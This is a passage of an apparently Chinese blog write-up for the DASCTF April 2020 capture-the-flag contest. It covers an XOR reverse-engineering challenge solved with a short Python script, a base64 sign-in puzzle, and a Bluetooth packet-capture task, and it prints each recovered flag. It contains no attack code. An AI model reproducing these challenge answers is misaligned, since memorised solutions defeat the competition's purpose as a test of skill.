[rsp+4Dh] [rbp-13h]</span>  <span class="token keyword">char</span> v46<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4Eh] [rbp-12h]</span>  <span class="token keyword">char</span> v47<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4Fh] [rbp-11h]</span>  <span class="token keyword">char</span> v48<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+50h] [rbp-10h]</span>  <span class="token keyword">char</span> v49<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+51h] [rbp-Fh]</span>  <span class="token keyword">char</span> v50<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+52h] [rbp-Eh]</span>  <span class="token keyword">char</span> v51<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+53h] [rbp-Dh]</span>  <span class="token keyword">char</span> v52<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+54h] [rbp-Ch]</span>  <span class="token keyword">char</span> v53<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+55h] [rbp-Bh]</span>  <span class="token keyword">unsigned</span> __int64 v54<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+58h] [rbp-8h]</span>  v54 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v16 <span class="token operator">=</span> <span class="token number">38</span><span class="token punctuation">;</span>  v17 <span class="token operator">=</span> <span class="token number">44</span><span class="token punctuation">;</span>  v18 <span class="token operator">=</span> <span class="token number">33</span><span class="token punctuation">;</span>  v19 <span class="token operator">=</span> <span class="token number">39</span><span class="token punctuation">;</span>  v20 <span class="token operator">=</span> <span class="token number">59</span><span class="token punctuation">;</span>  v21 <span class="token operator">=</span> <span class="token number">35</span><span class="token punctuation">;</span>  v22 <span class="token operator">=</span> <span class="token number">34</span><span class="token punctuation">;</span>  v23 <span class="token operator">=</span> <span class="token number">115</span><span class="token punctuation">;</span>  v24 <span class="token operator">=</span> <span class="token number">117</span><span class="token punctuation">;</span>  v25 <span class="token operator">=</span> <span class="token number">114</span><span class="token punctuation">;</span>  v26 <span class="token operator">=</span> <span class="token number">113</span><span class="token punctuation">;</span>  v27 <span class="token operator">=</span> <span class="token number">33</span><span class="token punctuation">;</span>  v28 <span class="token operator">=</span> <span class="token number">36</span><span class="token punctuation">;</span>  v29 <span class="token operator">=</span> <span class="token number">117</span><span class="token punctuation">;</span>  v30 <span class="token operator">=</span> <span class="token number">118</span><span class="token punctuation">;</span>  v31 <span class="token operator">=</span> <span class="token number">119</span><span class="token punctuation">;</span>  v32 <span class="token operator">=</span> <span class="token number">35</span><span class="token punctuation">;</span>  v33 <span class="token operator">=</span> <span class="token number">120</span><span class="token punctuation">;</span>  v34 <span class="token operator">=</span> <span class="token number">38</span><span class="token punctuation">;</span>  v35 <span class="token operator">=</span> <span class="token number">114</span><span class="token punctuation">;</span>  v36 <span class="token operator">=</span> <span class="token number">117</span><span class="token punctuation">;</span>  v37 <span class="token operator">=</span> <span class="token number">113</span><span class="token punctuation">;</span>  v38 <span class="token operator">=</span> <span class="token number">38</span><span class="token punctuation">;</span>  v39 <span class="token operator">=</span> <span class="token number">34</span><span class="token punctuation">;</span>  v40 <span class="token operator">=</span> <span class="token number">113</span><span class="token punctuation">;</span>  v41 <span class="token operator">=</span> <span class="token number">114</span><span class="token punctuation">;</span>  v42 <span class="token operator">=</span> <span class="token number">117</span><span class="token punctuation">;</span>  v43 <span class="token operator">=</span> <span class="token number">114</span><span class="token punctuation">;</span>  v44 <span class="token operator">=</span> <span class="token number">36</span><span class="token punctuation">;</span>  v45 <span class="token operator">=</span> <span class="token number">112</span><span class="token punctuation">;</span>  v46 <span class="token operator">=</span> <span class="token number">115</span><span class="token punctuation">;</span>  v47 <span class="token operator">=</span> <span class="token number">118</span><span class="token punctuation">;</span>  v48 <span class="token operator">=</span> <span class="token number">121</span><span class="token punctuation">;</span>  v49 <span class="token operator">=</span> <span class="token number">112</span><span class="token punctuation">;</span>  v50 <span class="token operator">=</span> <span class="token number">35</span><span class="token punctuation">;</span>  v51 <span class="token operator">=</span> <span class="token number">37</span><span class="token punctuation">;</span>  v52 <span class="token operator">=</span> <span class="token number">121</span><span class="token punctuation">;</span>  v53 <span class="token operator">=</span> <span class="token number">61</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"Please input your magic number"</span><span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>ostream<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>istream<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cin<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v11<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v11 <span class="token operator">&lt;=</span> <span class="token number">9</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>  v15 <span class="token operator">=</span> <span class="token keyword">operator</span> <span class="token keyword">new</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>v11<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v11<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">>></span><span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cin<span class="token punctuation">,</span> i <span class="token operator">+</span> v15<span class="token punctuation">)</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"You have input sth."</span><span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>ostream<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v8 <span class="token operator">=</span> std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"I will mix them with the enc_flag!"</span><span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>ostream<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">37</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> v11<span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>      v10 <span class="token operator">^</span><span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>k <span class="token operator">+</span> v15<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putchar</span><span class="token punctuation">(</span>v10 <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v16 <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"\nMaybe you have found the `flag`\n"</span><span class="token punctuation">,</span> v9<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>是 Cpp 唉。虽然逆向出来有点丑emmm。</p><p>大概意思是先让你输入一个 <code>magic number</code>，如果<code>v11 &lt;= 9</code>则返回 -1 退出，说明输入的数要大于9。</p><p>然后依次输入<code>v11</code>个数，存到<code>v15</code>及之后的空间内。</p><p>后面输出了一个 <code>enc_flag</code>。重点就是这几句嘛。</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">37</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> v11<span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>      v10 <span class="token operator">^</span><span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>k <span class="token operator">+</span> v15<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putchar</span><span class="token punctuation">(</span>v10 <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v16 <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  std<span class="token operator">::</span><span class="token keyword">operator</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"\nMaybe you have found the `flag`\n"</span><span class="token punctuation">,</span> v9<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>正好前面那串数字就有38个。看来起始的几个字符为 <code>flag</code>。</p><p><code>v10</code>依次和输入的每个数异或一下，再输出<code>v10</code>和最开始那串数字异或的结果。</p><p><strong>逆向的话，只要找到 <code>flag</code> 就完事了！</strong></p><p>于是直接爆破好了！</p><p><strong>Exp：</strong></p><p>输了几个数字觉得太麻烦了，于是直接<strong>正则匹配</strong>好了。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> res <span class="token operator">=</span> <span class="token triple-quoted-string string">"""v16 = 38;  v17 = 44;  v18 = 33;  v19 = 39;  v20 = 59;  v21 = 35;  v22 = 34;  v23 = 115;  v24 = 117;  v25 = 114;  v26 = 113;  v27 = 33;  v28 = 36;  v29 = 117;  v30 = 118;  v31 = 119;  v32 = 35;  v33 = 120;  v34 = 38;  v35 = 114;  v36 = 117;  v37 = 113;  v38 = 38;  v39 = 34;  v40 = 113;  v41 = 114;  v42 = 117;  v43 = 114;  v44 = 36;  v45 = 112;  v46 = 115;  v47 = 118;  v48 = 121;  v49 = 112;  v50 = 35;  v51 = 37;  v52 = 121;  v53 = 61;"""</span>t <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'v\d{2} = (\d+);'</span><span class="token punctuation">)</span>result <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>t<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print(result)</span>l <span class="token operator">=</span> list<span class="token punctuation">(</span>map<span class="token punctuation">(</span>int<span class="token punctuation">,</span> result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># [38, 44, 33, 39, 59, 35, 34, 115, 117, 114, 113, 33, 36, 117, 118, 119, 35, 120, 38, 114, 117, 113, 38, 34, 113, 114, 117, 114, 36, 112, 115, 118, 121, 112, 35, 37, 121, 61]</span></code></pre><p>得到一系列的数字，转换为字符串。上面用了 map，下面这里用用生成式的写法，嘻嘻。</p><p>而后先找出<code>flag</code>对应的<code>v10</code>，再用它来异或就完事了。</p><pre class=" language-python"><code class="language-python">l_str <span class="token operator">=</span> <span class="token punctuation">[</span>chr<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> l<span class="token punctuation">]</span>s2 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>l_str<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># &amp;,!';#"surq!$uvw#x&amp;ruq&amp;"qrur$psvyp#%y=</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>s2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> i<span class="token punctuation">)</span>    <span class="token keyword">if</span> tmp <span class="token operator">==</span> <span class="token string">'f'</span><span class="token operator">or</span> tmp <span class="token operator">==</span> <span class="token string">'F'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># f 64</span><span class="token comment" spellcheck="true"># F 96</span>final <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> x <span class="token keyword">in</span> s2<span class="token punctuation">:</span>    final <span class="token operator">+=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>final<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># flag{cb3521ad567c8f251fb1252d03690ce9}</span></code></pre><p>得到 flag：</p><p><code>flag{cb3521ad567c8f251fb1252d03690ce9}</code></p><br><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="（签到题）6G还远吗？"><a href="#（签到题）6G还远吗？" class="headerlink" title="（签到题）6G还远吗？"></a>（签到题）6G还远吗？</h3><blockquote><p>5G都来了，6G还远吗？6G下还需要开会员才能高速下载吗？请提交 DASCTF{} 里的内容。</p><p><a href="http://server.zhaoj.in:8888/1GTest.file" target="_blank" rel="noopener">http://server.zhaoj.in:8888/1GTest.file</a> or <a href="http://das.wetolink.com:8888/1GTest.file" target="_blank" rel="noopener">http://das.wetolink.com:8888/1GTest.file</a> </p></blockquote><p>文件大小显示是 977MB，然而下载速度慢到 1KB/s 不到，还不允许多线程……</p><p>想到估计是假的文件，毕竟是签到题，应该不难的。（才不像上个比赛假的签到</p><p>于是按下 F12，就看接收到的这部分 payload 好了。</p><p>或者就接收一部分然后截断也行。</p><p><img src="/2020/04/25/CTF_2020DASCTF_April/image-20200425164843561.png" alt="payload"></p><pre><code>REFTQ1RGe3dlbGNvbWVfdG9fREFTX0FwMXIxfc9Vo4jQqwH4ON+olEgxiijIjbgcdJur4VZjq9WlhUIIRq+hBbYkZEsVS5vux8bVmJVja6tNhXfCd6yA5ENaNdd71StufW73yWPvhDqb1CdPjqBjCCnbLVGqRkulvFFUZv6z7MllCQgkZhjm57ueMkPj28eSMymY4JLjYZ/bSPGkclsK1ySI+M/sn6QxLdKJhAvR4tVLHHrjdJBMPSRO52CAur7r5FEXCkjMEisOrAL9qufae0FV+iOGZAsH4cxJ0sMNSlNnX1Lso+6IlT0mj9QC+yRbQzsfZ4Bww/SMOLuWcosCLiQYtJRaG9tJiiR/R7vjRf5egHyBph1eVwMGA0puUvI8jXz9mdn08kfP2XxnB5CUdkhK2RIwJPwu+egKygfG+WeJihIa0eepB83Zvty/NUTpuPjmIS+DdS2yzYAc7IhdGNEbQpW5wG2zpNZDDS3l2E5YDAfF7oEyVFEE8CSB17sgzdCMzKgwbQhFU0o0260e2w53CvPHIvm/zlYgJC8pzj+cnGiM07VZ4Hw0CAeYwn9s1M1F2u4KTDQs+QnDrtMtc1yHBkkwjnDtV2VNZhWqK4fEwunu1i0cuWvdyPE5USj6+9ON2mfFCSxwaqRo++niZT5XDcsSKSEgKn4iO8tSt3uBH3YyimubWNNGzcnxPMRNGt+O6E6hzD1zKxZr/dRDQobygI6GZRGLHOQltIiiB6kkIUKeUM2tHBlKahmrBGDtJWfoXJ36aWV86+DEXGe/riFkCtMxn4u4OsDkXpRBr6/xYqMQh1gJIYqwG2e8D0OOTVsy505NXas9fLnhPM5FAdamkTwjsXmoK/9uKcQ1OC+s2xaSbB0B5QgEuxNAAcQDPft4rfo01PAgMb8N4F8NhVpLpLBrgu5FETKNiZb+j1HyRozIUCcDPhDKkWmgjMo9Pt9TIB+4iob6SwiJlY5lE5rPqr80eBMalZ9n2xl6DMAva75f9YYNVNLZ8fk5hl4ktO/WRBMX/f9z+q3YTsSS5lPgsQDv2lxbpNeRiJVyyirbSoBBJIK+ogMUbq5zxnBbWVFaeozIX2DA3J71G40+9JuHhXhN5mmXni910FhfSz2NBai7Oa2TWPcA0o8ug+CYsIPjvSzsEstMM+/ETpOLVhp+EKF47LT2h8uoZOi3y11BaNTyp03EVQYR/nkKqZz+BGPxb73BZEgVKahNQ2srFH8vYNHsDIrz2By4JXWbeeCx5zIZydorLfjVqEA12tmYcf7wcUoZGWLd/lAUDhP3itj4OiqwWdmyDsA5LNW7nzszELZlyiZJs/9zrAo13mK09Ih6dUbya8vmik4doSx3uH2FjB4zDUG9oxgrywTg+7PHYILSF/FGnMSZ9TiU/7icb0S5rAY7HpTJDgBWRGLhHiiiQVhuqtbEiax2KmgXBDeW4fs6DP/OChg36uBseoyoUGi0NVRloweGIWzVdPbhMw6YgXLMicln+KMNzgougS7QqgG9pvDWS6r46Ly9COwYoUGRGI50li4+c/rA0Y3CKA6W56GwFep/ozNQm7rmy+sP/lpOsTYN8TyCig2FuWnY7BQgk4iCiaTwY4MSBMR+7b/nhRQyBD4oANhmTWlwkjozt8VdPE+sWvNA2oy1GfhlbSNZImeU9xnPd0ZY7UoH5bXqIEhxSaMWUD09SOXWq14ku+QJs5iDiaGKnpG02oXPHTHxvMp4ib2VqZl8goSrbbiQsEDbRNKTfYyeIkLDNwlwhDgBlrQY6XuwlKFR6ws6MYefI8TxjkHrSDNkYj1eXmrELc612d31EUGcgityyt/Ge5uC+cz85jOBkgYkkeSQfP9/zSDVqbBK86oDVo/sFjdtKAwDwvX0Z8ZGKDRsyPIA2pY1Y5pXunMPSUEV/PcSD5R0fhKcWSLWQgkr3PsbXP9tEcu9IcBqyh0ZN5auFweQDh7XEM8U9sPlQKLGh9mS4m13VqSkzhRx6oeTDpPSAr9jFypxnsToNuJggYlnnsR2e7aVszPB0cK+z2lq/Rw69ta5S4UEQEE67v/bepkIZGN1j0Zs812cjq0HBwLCcRDwNnu9OsdveHOQeS0h2GFdehsPRCv3PGntda6es18I4XDO6T3CKxBIamstOlnwa1dY5f/rcIXNrJ57ljSk4zyHRQb/Gn5aGW/lmwkYYDQBQCRqwjv9L7CCjvg+RKwoo0ypgCPJA4sdKRQcd7fofnYdIldtA4N0hGReP83jmjXpsFJPGewnQw+y5KUyMYuF/iTTngBiN8Qm1437t8wRg9GJK3cM+5T5Tg908XJY9KMwjM24FbmitNBTXFR1nG3kRenmKZrMWW1SzuAFjhBsk5f0ztECgtvWa7SjA6qd03pbg/bxqYd5KVbE0KhbTZ7/LEf2FDwR6mXSy+ejNLl4088E++rVJj9FmLcAcbug3Qsz9ihRthxxEWYC0MffUC7N6hk5asRIm1J33vui7NVsGzKCpgZ33nkRieY0A1a5WJKoPfD8b9j6R8wLfk9CIIzXL+e/i2usCoqTXYD//J3DkUzB4oSgffdiCgNtEAj541qVYp1JIHA0F3FZ86g4lDGz429Tcgv7aA+mUBqdib05LqFZxgEeFOTZ5uqoKOI6+b+6wXm12+DbsCfesY4/bMtF3mHY+sPSEr/00U77OunBI3hLNxAtndhgRguL7H57iDypYQLq2IE4KSxe5nKz2lQoKrPHtUO/4lVOqyqvm7n4ITwCAaQ6JPHWMKbR1ZARyVdnzcZ9GFJTWJoqs7WhAk9PvNsskUPk8kWB3wP6EusOO9uUImSp/HvfUdU89/ik001/BSHedhDKLZEJltA32tjEbsuv4PLQKtdlhTL5dt/QR5CmkESCvOJsv4MyJXmGcww4LWtCjmxcwoSUXCY2n8yl3f9Bv1PRariIkyr6Rc/QZgIaO+rdM21GJEiNyb2TNs5Cm0lupCvm+u6/PR+pHxtHsoxZzMQvcNo9rfg/kjbCT2Gx/5W5MKFWOQSwf45Xwbtsxb/q1sOTP/7HILeuYgyh7qWRySGry9jjVXMR/XMlMnqPAiax6+uHNcaGESQUMow5i6tJEh/nWawF5DJls7G8LNqpGTLkr1mv6qOh+EmLpxOygrKhMgaCbGKRz/KbPzSLrZgRsCUEmMbe9CQXJNa7gy7raZADwpK8dRygbIaDm/RC4qDllAgQe9kH3lyuPkYxIoodev/fISYr8U23JQ8P1XU3ps7URTz0AAWkBaz6K/uyMiv3zgMqzhkYXgEZ2ihGc51P7+t8KTxyO/3cAoQ6bGL2x69TAu4rK2BM6dSKDgpSPQOeCRXANOTvM/Znz1E1mKLZz6r4U+Ts6nLLDiic+vt3fWCSIrKxYhF6viSnJ4uVFjAZkGhZPs+fTjJqjW55drSF1YxvngSAjxn8FNICvkVD9KCqrWfkprYAEOhicQ6htz+ctYv/8MO9FcxxKycXNw3LIf4ih9abb7BON/zEXM0Y6WIxDNZVP2PWvqYnBi6w1kPeCueTrneLUESTjvvCjcVx8uDpWi5h9N3jRGmCfRTNijEtZIRU6ra6f+6rH5b5fsF9LeGXNLRvHiIcEfgi6Bk6u2epsXO0joJPwCoJd5ZKp3YixjHjUrnvMm+W9VTAiHE0UIX+5D1CUEDcBbmsc8C+De9SwIRXmH+p+67n6rkHNxvctoHDXh/RNbXr6Tsbu24fMjkBJYT/9wkACRMauOx+rPK1NUuc2WDCyWZbXc8JEw3zzgN1w1yfmElTce6v7ahOy1A+n1lKUEmso30mmrAkU1Fzh1loFpxWiFXVbmr5Ct7xH1knCAJf4wDEkvfSawHCVuLYXuVs/WfzPn3VcNz2CUFvVCZRgnusv0F41PVVB75H5uNmEL6z3bsKgrfGzbyiuyCbcXe+X5UCr2WWfzEmFpqNwfaLD64GOTIxkRGY2n7VfkiccJzN3sefkCcPxaunfRq3xnKgxWgrwcdMAync/ZJwwYV7e0Jg0HlOIARGVd5/kRFZKbIpBfO95d5XTeLUNFtCOD9JqzC0WGBZCsyRkFFR6SjfV2yajwPG7ZSD4ExtDtvvPII7/PTtDdSD38MREg4E9oV6eE4bdj6aL0wM0e2RoJmGNKDb7kg8yd+pt1t2Gw1nz1oYbUyZX/yH647dX/ION+g7NIAOghn2udo8pb4ph8ZHOg+TVz8fkBcu7fVlAEeR/xRhFe5AuYglqzhYqPF1ezC+iDOo3H4TN/9etWpm6FN4wBUrMptqVrwpUQx5Vv1Y0v2KG91O8Y691FNdc8zS5UhYmZnWROsLfFTEGGTbhWFxjav09qE+IIXjIP25qqISZjq3qyCNo4P2zQHF/V4U/ym3h7RrvLimDRQ9ftga81VcMSOLIaFwnitN9myKNn/H0uMqTBdfdWFmt1gexY4x92WxXd8Yoj5v7uOjnGIoEfkORt8P7x3Ld4YnAOtcrHbZsX/PUa1i1clmn0Nj3rnJYbJPnxt+chH6UHzj0pvgdVuaBnUgILZktkF8HWE2HJ2KKMVOSwtjpNshsRH6VXqjQY+QGa1UpQWhkFIdjV7YH3COxHFZlb44Siajiy5jJ0+t8eSEsflmQ9kL9KoXCuz1/5QkVFvN5hYldQLBx5VkG3jCWD12XCR/uga6Ia0e8mV+1xiRHvJLaSfyxRIch5durhoW4VfM0lv60SQA2YmQuGhZbIX1isc7lauBLZQc5hNg00RYnyuTs9d/rFfmTnTNbUM77aq4HWtL0Idi4f94ENqOmi4TwAQRIQQQlPoqTvlLKOfbMM6YCnDiKiXIsT7wTHru67LAZ6VqSQ72ScgH3R7jHNAwBf7WUj2xfpdh/BhOTkkyf3SRXS4kn7Mh3nmJFTuKj/R5eiwrKJvbi6Xwtp5gWWNxzpGCrn6ShX6imDaT15t9bWOudaxZO2q4URzJWrB+t2GDvWjaLD9zTrfNmLXVsPJ7hOazcY7kYVPqbGnY2Zz7GzfydCWpK0fyChWo289oBuUpSqHKFoEkOI1t28wRP6VoAeXrXRKUavUK4494iEDVlBgq0z5/QDzzpiJEcahVCGB3vQDwYVKJpofx6V+4065qJ+zyxKZ1VRlKJ/KmWEUivbB5clFCHbvUKIy9K0XJQa7v+jarC03jxyIEYe82l9ziBcUKN3zGx+LoPHgJ40zM4vJf8ebiIKz6/cz2qNtVMGbR4la4rqAA9UJGPGuKU8i0UXDI2TFy3KjHqnPpZ+9yfeEV/V4Ly8WmPZPQyqEhXTXha8IGY9JlNZrjWWC+DqzsKmZJl8bSnmPWNimglQun/HhUHXpOvCm4tflKx0RmVasAa0L7wSb1qJNJf6Brekh0KaDy+8NQVUshR3XE90YnYdiAT5qy15hVM6wsB/7e/iTors5kaUJD35MTfbL1rrDufx6MZBs/WmerQ6vy20J4wwnNkCxllhWH4TI/DRh3OJzkG0AA3A==</code></pre><p>扔去 base64 解密，就可以得到 flag。</p><p><img src="/2020/04/25/CTF_2020DASCTF_April/image-20200425164902461.png" alt="base64 解密"></p><p>果然 <strong>flag 就在文件最开头</strong>哈哈哈~</p><p><code>DASCTF{welcome_to_DAS_Ap1r1}</code></p><h3 id="blueshark"><a href="#blueshark" class="headerlink" title="blueshark"></a>blueshark</h3><blockquote><p>Can you dig something you want out from the sea-colored beautiful shark?</p></blockquote><p><strong>题目附件：</strong><a href="2004225e9ff0cd86ee4.pcapng">在这里</a></p><p>一个流量包，看了是蓝牙协议，呜又是没见过的。发现 Wireshark 还可以分析蓝牙数据包唉。（（其实好多都可以</p><p>binwalk 发现了一个 7z 的压缩包，直接当成压缩包打开，发现有个 <code>password_is_Bluetooth_PIN.txt</code>文件，看来得找 PIN 了。</p><p>从数据包这里也找到了这个压缩包。</p><p><img src="/2020/04/25/CTF_2020DASCTF_April/image-20200425213537357.png" alt="what_you_want"></p><p>本来以为 PIN 就是4位的，还想爆破一波。。结果发现不是。</p><p>后面大佬说是在网络流里可以找到 PIN，emmm？</p><p>噢，Ctrl + F，选择 分组详情 或者 分组列表，字符串 或者 正则表达式，这样搜就找到了。</p><p><img src="/2020/04/25/CTF_2020DASCTF_April/image-20200425234819265.png" alt="PIN"></p><p>PIN 就是 <code>141854</code>。</p><p>用来解压就可以得到 